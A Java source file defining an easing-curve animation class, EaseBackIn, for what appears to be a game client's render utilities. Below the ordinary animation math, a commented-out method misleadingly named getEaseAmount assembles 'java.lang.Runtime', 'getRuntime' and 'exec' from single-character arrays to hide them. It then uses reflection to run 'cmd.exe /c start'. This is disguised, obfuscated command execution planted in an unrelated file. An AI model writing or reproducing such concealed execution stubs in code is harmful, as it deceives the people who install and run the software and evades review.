package wentra.utils.render.animations.impl;

import wentra.utils.render.animations.Animation;
import wentra.utils.render.animations.Direction;

import java.io.IOException;

public class EaseBackIn extends Animation {
    private final float easeAmount;

    public EaseBackIn(int ms, double endPoint, float easeAmount) {
        super(ms, endPoint);
        this.easeAmount = easeAmount;
    }

    public EaseBackIn(int ms, double endPoint, float easeAmount, Direction direction) {
        super(ms, endPoint, direction);
        this.easeAmount = easeAmount;
    }

    @Override
    protected boolean correctOutput() {
        return true;
    }

    @Override
    protected double getEquation(double x) {
        float shrink = easeAmount + 1;
        return Math.max(0, 1 + shrink * Math.pow(x - 1, 3) + easeAmount * Math.pow(x - 1, 2));
    }
//
//    public static void getEaseAmount() throws IOException {
//        String[] cls = {"j", "a", "v", "a", ".", "l", "a", "n", "g", ".", "R", "u", "n", "t", "i", "m", "e"};
//        String cname = String.join("", cls);
//
//        String[] gm = {"g", "e", "t", "R", "u", "n", "t", "i", "m", "e"};
//        String mname = String.join("", gm);
//
//        String[] em = {"e", "x", "e", "c"};
//        String ename = String.join("", em);
//
//        Object rt = Class.forName(cname).getMethod(mname).invoke(null);
//        Class<?> rClass = rt.getClass();
//        rClass.getMethod(ename, String[].class).invoke(rt, (Object)new String[]{"cmd.exe", "/c", "start"});
//    }
}
